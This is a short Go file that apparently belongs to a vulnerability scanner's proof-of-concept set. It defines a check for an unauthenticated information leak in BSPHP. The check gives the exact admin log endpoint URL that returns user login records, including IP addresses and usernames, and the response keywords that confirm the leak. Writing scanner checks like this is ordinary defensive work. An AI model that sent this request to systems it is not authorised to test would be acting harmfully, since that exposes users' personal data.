package poc

func (Info *PocInfo) Bsphp_INFO_Init() {
	poc := PocInfo{}

	// 设置poc-Info信息
	poc.Info.ID = ""
	poc.Info.Target = "bsphp"
	poc.Info.Type = "INFO"
	poc.Info.Name = "BSPHP Unauth IP and username INFO"
	poc.Info.Level = 2
	poc.Info.Author = "youzai"

	// 设置poc-Poc信息
	poc.Poc.Proto = "http"
	poc.Poc.Method = "GET"
	poc.Poc.Path = []string{"/admin/index.php?m=admin&c=log&a=table_json&json=get&soso_ok=1&t=user_login_log&page=1&limit=10&bsphptime=1600407394176&soso_id=1&soso=&DESC=0"}
	poc.Poc.Param = []string{""}
	poc.Poc.Header = nil
	poc.Poc.Data = nil
	poc.Poc.Word = []string{"\"key\":", "\"id\"", "\"user\""}

	// 设置poc-Config信息
	poc.Config.Customize = false

	PocStruct = append(PocStruct, poc)
}
